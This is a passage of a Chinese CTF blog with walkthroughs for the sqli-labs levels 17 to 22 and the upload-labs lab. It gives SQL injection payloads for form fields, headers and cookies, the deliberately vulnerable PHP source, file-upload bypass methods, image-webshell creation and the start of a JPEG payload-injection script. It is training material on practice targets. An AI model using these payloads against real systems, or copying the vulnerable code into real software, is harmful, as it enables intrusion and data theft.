/&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;else&#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125; Less-17接着就是update注入了，对于这种注入，最好的方法感觉就是报错注入了 猜测后台sql语句： 1update users set password=&#x27;$password&#x27; where username=&#x27;$username&#x27; 我们直接报错注入： 1uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or updatexml(1,concat(0x3a,(select database())),1)%23&amp;submit&#x3D;Submit 注意这里uname表里必须有，后面的updatexml才会执行 还可以时间盲注： 1uname&#x3D;admin&amp;passwd&#x3D;sadasda&#39; or if(substr((select database()),1,1)&#x3D;&#39;s&#39;,sleep(3),0)%23&amp;submit&#x3D;Submit 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)&#123;if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabledif (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a numberif (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125;else &#123; $value = intval($value); &#125;return $value;&#125;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;//making sure uname is not injectable$uname=check_input($_POST[&#x27;uname&#x27;]);$passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;);fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; $row1 = $row[&#x27;username&#x27;]; $update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; echo &#x27;&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;else&#123; echo &#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;;&#125;&#125;?&gt; Less-18这个是User-Agent insert注入 sql语句： 1INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname) 报错注入构造： 1User-Agent: firefox&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27; 这里的账号密码必须正确 也可以时间盲注： 1User-Agent: firefox&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27; 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)&#123;if(!empty($value))&#123;// truncation (see comments)$value = substr($value,0,20);&#125;// Stripslashes if magic quotes enabledif (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125;// Quote if not a numberif (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125;else &#123; $value = intval($value); &#125;return $value;&#125;$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your IP ADDRESS is: &#x27; .$IP;echo &quot;&lt;br&gt;&quot;;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]);$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Agent:&#x27;.$uname.&quot;\\n&quot;);fclose($fp);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$result1 = mysql_query($sql);$row1 = mysql_fetch_array($result1);if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; mysql_query($insert); echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &#x27;Your User Agent is: &#x27; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125;else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125;&#125;?&gt; Less-19这个是Referer insert注入，和上一关思路一样 sql语句： 1INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$refer&#x27;, &#x27;$IP&#x27;) 报错注入构造： 1Referer: 1&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27; 时间盲注构造: 1Referer: 1&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27; 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);function check_input($value)&#123;if(!empty($value))&#123;// truncation (see comments)$value = substr($value,0,20);&#125;// Stripslashes if magic quotes enabledif (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125;// Quote if not a numberif (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125;else &#123; $value = intval($value); &#125;return $value;&#125;$uagent = $_SERVER[&#x27;HTTP_REFERER&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your IP ADDRESS is: &#x27; .$IP;echo &quot;&lt;br&gt;&quot;;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]);//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;Referer:&#x27;.$uname.&quot;\\n&quot;);fclose($fp);$sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;$result1 = mysql_query($sql);$row1 = mysql_fetch_array($result1);if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; $insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; mysql_query($insert); echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &#x27;Your Referer is: &#x27; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125;else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125;&#125;?&gt; Less-20这个就是Cookie注入了，sql语句： 1SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1 先登陆进去发现Cookie字段增加了uname,直接联合查询 1Cookie: uname=adsadas&#x27; union select 1,2,database()%23 报错注入： 1Cookie: uname=asddasd&#x27; or updatexml(1,concat(0x3a,(select user())),1)%23 时间盲注： 1Cookie: uname=adsadas&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0)%23 布尔盲注： 1Cookie: uname=adsadas&#x27; or substr((select database()),1,1)=&#x27;s&#x27;%23 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);if(!isset($_COOKIE[&#x27;uname&#x27;]))&#123; //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); function check_input($value) &#123; if(!empty($value)) &#123; $value = substr($value,0,20); // truncation (see comments) &#125; if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) // Quote if not a number &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $uname = check_input($_POST[&#x27;uname&#x27;]); $passwd = check_input($_POST[&#x27;passwd&#x27;]); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); $cookee = $row1[&#x27;username&#x27;]; if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; setcookie(&#x27;uname&#x27;, $cookee, time()+3600); header (&#x27;Location: index.php&#x27;); echo &quot;I LOVE YOU COOKIES&quot;; echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; &#125;&#125;else&#123; if(!isset($_POST[&#x27;submit&#x27;])) &#123; $cookee = $_COOKIE[&#x27;uname&#x27;]; $format = &#x27;D d M Y - H:i:s&#x27;; $timestamp = time() + 3600; echo &quot;&lt;center&gt;&quot;; echo &#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;; echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;; echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;; echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp); echo &quot;&lt;br&gt;&lt;/font&gt;&quot;; $sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your ID:&#x27; .$row[&#x27;id&#x27;]; &#125; else &#123; echo &quot;&lt;center&gt;&quot;; echo &#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;; echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; &#125; echo &#x27;&lt;center&gt;&#x27;; echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;; echo &#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;; echo &#x27;&lt;/form&gt;&#x27;; echo &#x27;&lt;/center&gt;&#x27;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;; echo &quot; Your Cookie is deleted&quot;; setcookie(&#x27;uname&#x27;, $row1[&#x27;username&#x27;], time()-3600); header (&#x27;Location: index.php&#x27;); echo &#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;; &#125;fwrite($fp,&#x27;Cookie:&#x27;.$cookee.&quot;\\n&quot;);fclose($fp);&#125;?&gt; Less-21这个和上面的没啥差别，只不过将uname base64加密了 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);if(!isset($_COOKIE[&#x27;uname&#x27;]))&#123; //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); function check_input($value) &#123; if(!empty($value)) &#123; $value = substr($value,0,20); // truncation (see comments) &#125; if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) // Quote if not a number &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $uname = check_input($_POST[&#x27;uname&#x27;]); $passwd = check_input($_POST[&#x27;passwd&#x27;]); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600); echo &quot;I LOVE YOU COOKIES&quot;; echo &quot;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; //echo &#x27;Your Cookie is: &#x27; .$cookee; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; header (&#x27;Location: index.php&#x27;); &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; &#125;&#125;else&#123; if(!isset($_POST[&#x27;submit&#x27;])) &#123; $cookee = $_COOKIE[&#x27;uname&#x27;]; $format = &#x27;D d M Y - H:i:s&#x27;; $timestamp = time() + 3600; echo &quot;&lt;center&gt;&quot;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;; echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;; echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;; echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp); $cookee = base64_decode($cookee); echo &quot;&lt;br&gt;&lt;/font&gt;&quot;; $sql=&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your ID:&#x27; .$row[&#x27;id&#x27;]; &#125; else &#123; echo &quot;&lt;center&gt;&quot;; echo &#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;; echo &#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; //echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;; &#125; echo &#x27;&lt;center&gt;&#x27;; echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;; echo &#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;; echo &#x27;&lt;/form&gt;&#x27;; echo &#x27;&lt;/center&gt;&#x27;; &#125; else &#123; echo &#x27;&lt;center&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;; echo &quot; Your Cookie is deleted&quot;; setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()-3600); header (&#x27;Location: index.php&#x27;); echo &#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;; &#125; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;Cookie:&#x27;.$cookee.&quot;\\n&quot;); fclose($fp);&#125;?&gt; Less-22这个闭合方式变成双引号就行了，20关的四种注入都行 关键代码123$cookee = base64_decode($cookee);$cookee1 = &#x27;&quot;&#x27;. $cookee. &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"sql注入","slug":"sql注入","permalink":"http://www.moonback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"upload-labs靶场通关手册","slug":"upload-labs-wp","date":"2019-10-16T14:23:20.000Z","updated":"2019-10-16T14:41:10.817Z","comments":true,"path":"2019/10/16/upload-labs-wp/","link":"","permalink":"http://www.moonback.xyz/2019/10/16/upload-labs-wp/","excerpt":"本篇博客介绍了uploadlabs靶场通关指南！为了方便显示，这里把一句话写成phpinfo,并使用bp抓包!","text":"本篇博客介绍了uploadlabs靶场通关指南！为了方便显示，这里把一句话写成phpinfo,并使用bp抓包! Pass-01考察点：本地js检验 通关方法： 上传webshell时将其后缀改为.jpg或.png或.gif,再用bp抓包将其改为.php后缀 修改js代码，F12代开开发人员工具，修改checkFile()函数 Pass-02考察点：MIME类型检测 通关方法： 上传webshell时将其后缀改为.jpg或.png或.gif,再用bp抓包将其改为.php后缀 Pass-03考察点：特殊后缀名绕过 通关方法： 因为没有js检测，直接上传.phtml后缀就可以，可以看到下面有个无法显示的图片，右键可以获取到图片的地址 将其注释取消重启Apache即可解析 Pass-04考察点：.htaccess绕过 通关方法： 先上传一个.htaccess文件，文件内容如下： 123&lt;FilesMatch &quot;xxx&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt; 再上传一个test.xxx文件(写入webshell)，test.xxx就可以被解析成php代码执行 注意：php版本问题可能会导致解析失败，亲测php5.2.17完美解析 Pass-05考察点：大小写绕过 通关方法： 上传为.Php后缀的webshell Pass-06考察点：后缀加空格绕过 通关方法： 用bp抓包将其改为.php后缀的webshell Pass-07考察点：windows加.绕过(对文件命名时最后一个字符为.会自动忽略) 通关方法： 用bp抓包将其改为.php.后缀 Pass-08考察点：windows::$DATA绕过绕过 通关方法： 用bp抓包将其改为.php::$DATA后缀 Pass-09考察点：后缀加. .绕过 通关方法： 用bp抓包将其改为.php. .后缀 Pass-10考察点：双写绕过 通关方法： 用bp抓包将其改为.pphphp后缀 1234$deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name); 可以看到源码中将可以当成php解析的后缀都替换成空了 注意：文件名中的关键词也会替换 Pass-11考察点：%00截断绕过绕过白名单 通关方法： 用bp抓包将 save_path保存为： save_path=../upload/phpinfo.php%00 $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 通过代码审计可以看出来，$_GET[‘save_path’]可以用%00绕过 Pass-12考察点：二进制00截断漏洞绕过白名单 通关方法： 用bp抓包将 save_path保存为： save_path=../upload/phpinfo.php* *代表00 和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。 Pass-13考察点：图片马 通关方法： 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file &#x3D; fopen($filename, &quot;rb&quot;); $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节 fclose($file); $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin); $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType &#x3D; &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType &#x3D; &#39;jpg&#39;; break; case 13780: $fileType &#x3D; &#39;png&#39;; break; case 7173: $fileType &#x3D; &#39;gif&#39;; break; default: $fileType &#x3D; &#39;unknown&#39;; &#125; return $fileType;&#125; 由源码可知，是通过检测文件头(两个字节)来判断文件类型的 通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作方法：cmd下 1copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg 上传图片马，使用文件包含包含上传的图片马 或者在webshell前面一行加上GIF89a,并命名为.gif后缀文件，即可生成gif类型的图片马 Pass-14考察点：图片马 通关方法： 源码getimagesize()函数获取文件类型，还是直接就可以利用图片马就可进行绕过 getimagesize()函数是通过识别文件头来判别是否是图片文件的 Pass-15考察点：图片马 通关方法： 这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过 Pass-16考察点：图片马+content-type+二次渲染 通关方法： 本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染 什么是二次渲染呢？二次渲染就是调用API，例如php的GD库，重新生成一张图片，在生成的过程中，把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染 对渲染/加载测试的攻击方式是代码注入绕过 对二次渲染攻击方式是攻击文件加载器自身 关于绕过二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了 将上传的图片下载到本地，使用16进制编辑器将其打开，发现其内容已经改变 上传gif上传png上传jpg这里也采用国外大牛编写的脚本jpg_payload.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php&#x2F;*The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().It is necessary that the size and quality of the initial image are the same as those of the processed image.1) Upload an arbitrary image via secured files upload script2) Save the processed image and launch:jpg_payload.php &lt;jpg_name.jpg&gt;In case of successful injection you will get a specially crafted image, which should be uploaded again.Since the most straightforward injection method is used, the following problems can occur:1) After the second processing the injected data may become partially corrupted.2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.Sergey Bobrov @Black2Fan.See also:https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;*&#x2F;$miniPayload &#x3D; &quot;&lt;?&#x3D;phpinfo();?&gt;&quot;;if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123; die(&#39;php-gd is not installed&#39;);&#125;if(!isset($argv[1])) &#123; die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);&#125;set_error_handler(&quot;custom_error_handler&quot;);for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize &#x3D; $pad; $dis &#x3D; new DataInputStream($argv[1]); $outStream &#x3D; 